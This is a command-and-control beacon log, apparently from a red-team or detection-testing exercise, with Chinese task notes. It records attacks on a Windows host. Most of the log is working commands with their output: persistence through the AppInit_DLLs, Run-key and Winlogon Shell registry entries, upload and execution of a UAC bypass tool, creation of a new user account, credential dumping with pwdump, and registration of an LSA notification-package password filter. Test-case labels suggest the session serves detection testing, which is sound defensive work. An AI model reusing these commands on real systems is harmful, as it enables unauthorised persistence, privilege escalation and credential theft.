02/05 16:17:27 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3420; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/05 16:19:12 [task] cd C:\Windows\System32\
02/05 16:19:12 [task] 利用 reg命令设置app_init 项 
02/05 16:19:12 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe add  "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /f /v  AppInit_DLLs /t REG_SZ /d "c:\test.dll"
02/05 16:19:19 [task] 计划任务运行rundll32
02/05 16:19:25 [checkin] host called home, sent: 364 bytes
02/05 16:19:25 [output]
received output:
操作成功完成。

C:\Windows\System32>

02/05 16:19:25 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 spawn 已经存在。
要替换它吗(Y/N)?

02/05 16:19:44 [task] 通过reg命令设置注册表项
02/05 16:19:44 [task] cd C:\Windows\System32\
02/05 16:19:44 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v T1060 /t REG_SZ /d "c:\window\system32\calc.exe" /f
02/05 16:19:52 [task] 设置Winlogon 加载项
02/05 16:20:25 [checkin] host called home, sent: 428 bytes
02/05 16:20:26 [output]
received output:
操作成功完成。

C:\Windows\System32>

02/05 16:20:26 [output]
received output:
操作成功完成。

C:\Windows\System32>

02/05 16:35:49 [task] 通过reg命令设置注册表项
02/05 16:35:49 [task] cd C:\Windows\System32\
02/05 16:35:49 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -propertyType REG_SZ -Value c:\window\system32\calc.exe
02/05 16:35:59 [task] 设置Winlogon 加载项
02/05 16:36:26 [checkin] host called home, sent: 373 bytes
02/05 16:36:26 [error] could not spawn new-ItemProperty -path HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -name Shell -propertyType REG_SZ -Value Explorer.exe,c:\RedTeam\pwd.exe: 2
02/05 16:36:26 [output]
received output:
'new-ItemProperty' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/05 16:38:52 [task] 通过reg命令设置注册表项
02/05 16:38:52 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -propertyType REG_SZ -Value c:\window\system32\calc.exe
02/05 16:38:58 [task] 设置Winlogon 加载项
02/05 16:38:58 [task] Tasked beacon to run: new-ItemProperty -path HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -name Shell -propertyType REG_SZ -Value Explorer.exe,c:\RedTeam\pwd.exe
02/05 16:39:26 [checkin] host called home, sent: 918 bytes
02/05 16:39:27 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 无法绑定参数 "Type"。无法将“REG_SZ”转换为“Microsoft.Win32_x000D__x000A_</S><S S="Error">.RegistryValueKind”。可能的枚举值包括“String、ExpandString、Binary、DWord、Mu_x000D__x000A_</S><S S="Error">ltiString、QWord、Unknown”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\_x000D__x000A_</S><S S="Error">Run -Name T1060 -propertyType REG_SZ -Value c:\window\system32\calc.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (REG_SZ:String) [New-ItemProper _x000D__x000A_</S><S S="Error">   ty], ArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Co _x000D__x000A_</S><S S="Error">   mmands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:39:27 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到接受实际参数“NT\CurrentVersion\Winlogon”的位置形式参_x000D__x000A_</S><S S="Error">数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -path HKCU:\Software\Microsoft\Windows NT\CurrentVersi_x000D__x000A_</S><S S="Error">on\Winlogon -name Shell -propertyType REG_SZ -Value Explorer.exe,c:\RedTeam\pwd_x000D__x000A_</S><S S="Error">.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [New-ItemProperty], Paramet _x000D__x000A_</S><S S="Error">   erBindingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:40:54 [task] 通过reg命令设置注册表项
02/05 16:40:54 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe
02/05 16:41:01 [task] 设置Winlogon 加载项
02/05 16:41:01 [task] Tasked beacon to run: new-ItemProperty -path HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -name Shell -Value Explorer.exe,c:\RedTeam\pwd.exe
02/05 16:41:27 [checkin] host called home, sent: 806 bytes
02/05 16:41:27 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 该属性已存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\_x000D__x000A_</S><S S="Error">Run -Name T1060 -Value c:\window\system32\calc.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ResourceExists: (HKEY_CURRENT_US...rentVersion\R _x000D__x000A_</S><S S="Error">   un:String) [New-ItemProperty], IOException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Comma _x000D__x000A_</S><S S="Error">   nds.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:41:27 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到接受实际参数“NT\CurrentVersion\Winlogon”的位置形式参_x000D__x000A_</S><S S="Error">数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -path HKCU:\Software\Microsoft\Windows NT\CurrentVersi_x000D__x000A_</S><S S="Error">on\Winlogon -name Shell -Value Explorer.exe,c:\RedTeam\pwd.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [New-ItemProperty], Paramet _x000D__x000A_</S><S S="Error">   erBindingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:43:51 [task] 通过reg命令设置注册表项
02/05 16:43:51 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 16:43:51 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe
02/05 16:43:56 [task] Tasked beacon to run: remove-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell
02/05 16:43:56 [task] 设置Winlogon 加载项
02/05 16:43:56 [task] Tasked beacon to run: new-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell -Value Explorer.exe,c:\RedTeam\pwd.exe
02/05 16:44:27 [checkin] host called home, sent: 1440 bytes
02/05 16:44:28 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows\CurrentVersion\Run
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows\CurrentVersion
PSChildName  : Run
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry
T1060        : c:\window\system32\calc.exe





02/05 16:44:28 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : RegistryKey.SetValue 不支持类型为“Object[]”的数组。只支持 _x000D__x000A_</S><S S="Error">Byte[] 和 String[]。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVer_x000D__x000A_</S><S S="Error">sion\Winlogon -name Shell -Value Explorer.exe,c:\RedTeam\pwd.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : WriteError: (HKEY_CURRENT_US...ersion\Winlogon:S _x000D__x000A_</S><S S="Error">   tring) [New-ItemProperty], ArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Co _x000D__x000A_</S><S S="Error">   mmands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:46:51 [task] Tasked beacon to run: remove-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell
02/05 16:46:51 [task] 设置Winlogon 加载项
02/05 16:46:51 [task] Tasked beacon to run: new-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell -Value 'Explorer.exe,c:\RedTeam\pwd.exe'
02/05 16:47:28 [checkin] host called home, sent: 758 bytes
02/05 16:47:29 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_CURRENT_USER\Software\Microsoft\Windows NT\Curr_x000D__x000A_</S><S S="Error">entVersion\Winlogon 处不存在属性 Shell。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -path HKCU:\Software\Microsoft\"Windows NT"\Current_x000D__x000A_</S><S S="Error">Version\Winlogon -name Shell_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (Shell:String) [Remove-ItemProp _x000D__x000A_</S><S S="Error">   erty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:47:29 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows NT\CurrentVersion\Winlogon
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows NT\CurrentVersion
PSChildName  : Winlogon
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry
Shell        : Explorer.exe,c:\RedTeam\pwd.exe





02/05 16:53:17 [task] 通过reg命令设置注册表项
02/05 16:53:17 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 16:53:17 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe /force
02/05 16:53:29 [checkin] host called home, sent: 710 bytes
02/05 16:53:30 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到接受实际参数“/force”的位置形式参数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\_x000D__x000A_</S><S S="Error">Run -Name T1060 -Value c:\window\system32\calc.exe /force_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [New-ItemProperty], Paramet _x000D__x000A_</S><S S="Error">   erBindingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 16:59:54 [task] 通过reg命令设置注册表项
02/05 16:59:54 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 16:59:54 [task] Tasked Beacon to execute: C:\Windows\System32\reg.exe add  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "T1060" /t REG_SZ /d "c:\window\system32\calc.exe" in a high integrity context
02/05 17:00:30 [checkin] host called home, sent: 75901 bytes
02/05 17:00:31 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current_x000D__x000A_</S><S S="Error">Version\Run 处不存在属性 T1060。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Run -Name T1060_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (T1060:String) [Remove-ItemProp _x000D__x000A_</S><S S="Error">   erty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:00:31 [output]
received output:
[-] You're already in a high integrity context.

02/05 17:01:16 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
02/05 17:01:16 [task] Tasked beacon to make directory c:\RedTeam\
02/05 17:01:16 [task] cd c:\RedTeam\
02/05 17:01:16 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
02/05 17:01:17 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
02/05 17:01:17 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
02/05 17:01:31 [checkin] host called home, sent: 160369 bytes
02/05 17:06:48 [task] 4************一键执行所有凭证获取的测试用例************
02/05 17:06:48 [task] 测试 IOAT1098_001 
02/05 17:06:48 [task] 测试 IOAT1098_001_Rule 方法2
02/05 17:06:48 [task] Tasked beacon to execute: net user Account /add
02/05 17:06:49 [task] 传输dump工具到服务端并执行
02/05 17:06:49 [task] Tasked beacon to make directory c:\RedTeam\
02/05 17:06:49 [task] cd c:\RedTeam\
02/05 17:06:49 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\pwdump.exe as pwdump.exe
02/05 17:06:49 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes pwdump.exe
02/05 17:06:49 [task] Tasked beacon to execute: c:\redteam\pwdump.exe
02/05 17:06:49 [task] cd c:\Windows\System32
02/05 17:06:49 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
02/05 17:06:49 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0aisakeng" /f
02/05 17:07:31 [checkin] host called home, sent: 170039 bytes
02/05 17:07:32 [output]
received output:
命令成功完成。



02/05 17:07:32 [output]
received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli\0aisakeng


c:\Windows\System32>

02/05 17:07:32 [output]
received output:
操作成功完成。

c:\Windows\System32>

02/05 17:09:04 [task] 通过reg命令设置注册表项
02/05 17:09:04 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 17:09:04 [task] Tasked Beacon to execute: C:\Windows\System32\reg.exe add  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "T1060" /t REG_SZ /d "c:\window\system32\calc.exe" in a high integrity context
02/05 17:09:32 [checkin] host called home, sent: 75901 bytes
02/05 17:09:33 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current_x000D__x000A_</S><S S="Error">Version\Run 处不存在属性 T1060。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Run -Name T1060_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (T1060:String) [Remove-ItemProp _x000D__x000A_</S><S S="Error">   erty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:09:33 [output]
received output:
[-] You're already in a high integrity context.

02/05 17:13:43 [task] Tasked beacon to run: remove-ItemProperty -path HKLM:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell
02/05 17:13:43 [task] 设置Winlogon 加载项
02/05 17:13:43 [task] Tasked beacon to run: new-ItemProperty -path HKLM:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell -Value 'Explorer.exe,c:\RedTeam\pwd.exe'
02/05 17:14:33 [checkin] host called home, sent: 758 bytes
02/05 17:14:33 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows NT\CurrentVersion\Winlogon
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows NT\CurrentVersion
PSChildName  : Winlogon
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
Shell        : Explorer.exe,c:\RedTeam\pwd.exe





02/05 17:15:04 [task] 通过reg命令设置注册表项
02/05 17:15:04 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 17:15:04 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe
02/05 17:15:33 [checkin] host called home, sent: 690 bytes
02/05 17:15:34 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curren_x000D__x000A_</S><S S="Error">tVersion\Run 处不存在属性 T1060。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Run -Name T1060_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (T1060:String) [Remove-ItemProp _x000D__x000A_</S><S S="Error">   erty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:15:34 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows\CurrentVersion\Run
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows\CurrentVersion
PSChildName  : Run
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
T1060        : c:\window\system32\calc.exe





02/05 17:26:40 [task] 通过reg命令设置注册表项
02/05 17:26:40 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 17:26:40 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe
02/05 17:27:34 [checkin] host called home, sent: 690 bytes
02/05 17:27:35 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows\CurrentVersion\Run
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\
               Microsoft\Windows\CurrentVersion
PSChildName  : Run
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
T1060        : c:\window\system32\calc.exe





02/05 17:28:30 [task] 通过reg命令设置注册表项
02/05 17:28:30 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060
02/05 17:28:30 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name T1060 -Value c:\window\system32\calc.exe
02/05 17:28:35 [checkin] host called home, sent: 690 bytes
02/05 17:28:35 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current_x000D__x000A_</S><S S="Error">Version\Run 处不存在属性 T1060。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Run -Name T1060_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (T1060:String) [Remove-ItemProp _x000D__x000A_</S><S S="Error">   erty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:28:35 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows\CurrentVersion\Run
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows\CurrentVersion
PSChildName  : Run
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry
T1060        : c:\window\system32\calc.exe





02/05 17:48:29 [task] Tasked beacon to run: remove-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell
02/05 17:48:29 [task] 设置Winlogon 加载项
02/05 17:48:29 [task] Tasked beacon to run: new-ItemProperty -path HKCU:\Software\Microsoft\"Windows NT"\CurrentVersion\Winlogon -name Shell -Value 'Explorer.exe,c:\RedTeam\pwd.exe'
02/05 17:48:36 [checkin] host called home, sent: 758 bytes
02/05 17:48:36 [output]
received output:


PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows NT\CurrentVersion\Winlogon
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
               icrosoft\Windows NT\CurrentVersion
PSChildName  : Winlogon
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry
Shell        : Explorer.exe,c:\RedTeam\pwd.exe





02/05 17:48:55 [task] Tasked beacon to make directory c:\RedTeam\
02/05 17:48:55 [task] cd c:\RedTeam\
02/05 17:48:55 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.bat as T1004.bat
02/05 17:48:55 [indicator] file: d41d8cd98f00b204e9800998ecf8427e 0 bytes T1004.bat
02/05 17:48:55 [task] 设置Winlogon 加载项
02/05 17:48:55 [task] Tasked beacon to run: C:RedTeamT1004.bat
02/05 17:49:36 [checkin] host called home, sent: 170 bytes
02/05 17:49:37 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">无法将“C:RedTeamT1004.bat”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。_x000D__x000A_</S><S S="Error">请检查名称的拼写，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 19_x000D__x000A_</S><S S="Error">+ C:RedTeamT1004.bat &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (C:RedTeamT1004.bat:String) [],  _x000D__x000A_</S><S S="Error">   CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:51:17 [task] Tasked beacon to make directory c:\RedTeam\
02/05 17:51:17 [task] cd c:\RedTeam\
02/05 17:51:17 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.bat as T1004.bat
02/05 17:51:17 [indicator] file: d41d8cd98f00b204e9800998ecf8427e 0 bytes T1004.bat
02/05 17:51:17 [task] 设置Winlogon 加载项
02/05 17:51:17 [task] Tasked beacon to run: C:\RedTeam\T1004.bat
02/05 17:51:37 [checkin] host called home, sent: 178 bytes
02/05 17:51:37 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">无法执行程序“T1004.bat”: %1 不是有效的 Win32 应用程序。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 21_x000D__x000A_</S><S S="Error">+ C:\RedTeam\T1004.bat &lt;&lt;&lt;&lt; 。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1_x000D__x000A_</S><S S="Error">+  &lt;&lt;&lt;&lt; C:\RedTeam\T1004.bat_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NativeCommandFailed_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/05 17:54:00 [task] Tasked beacon to make directory c:\RedTeam\
02/05 17:54:00 [task] cd c:\RedTeam\
02/05 17:54:00 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.bat as T1004.bat
02/05 17:54:00 [indicator] file: d41d8cd98f00b204e9800998ecf8427e 0 bytes T1004.bat
02/05 17:54:00 [task] 设置Winlogon 加载项
02/05 17:54:00 [task] Tasked beacon to run: C:\RedTeam\T1004.bat
02/05 17:54:37 [checkin] host called home, sent: 110 bytes
